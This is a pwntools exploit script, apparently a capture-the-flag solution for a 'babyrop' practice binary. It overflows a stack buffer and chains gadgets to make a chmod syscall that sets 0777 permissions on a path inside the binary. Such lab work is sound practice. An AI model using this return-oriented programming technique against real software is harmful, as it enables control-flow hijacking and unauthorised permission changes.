from pwn import *

# Init
elf = ELF("/challenge/babyrop_level5.1")
context.arch = "amd64"
context.endian = "little"
io = elf.process()

# Vars
buffer_length = 76 + 4 + 8 # local_58 and variable int 4 byte (local_c) + EBP


leaving_addr = p64(0x00403004)
syscall_gadget = p64(0x0000000000402123)
set_rdi_registry_gadget = p64(0x000000000040213b)
set_rsi_registry_gadget = p64(0x000000000040212b)
set_rax_registry_gadget = p64(0x000000000040211c)
access_rights = p64(0o777)

# Payload
payload = b"A"*buffer_length + set_rax_registry_gadget + p64(0x5a) + set_rdi_registry_gadget + leaving_addr + set_rsi_registry_gadget + access_rights + syscall_gadget

# Action
io.sendline(payload)
io.interactive()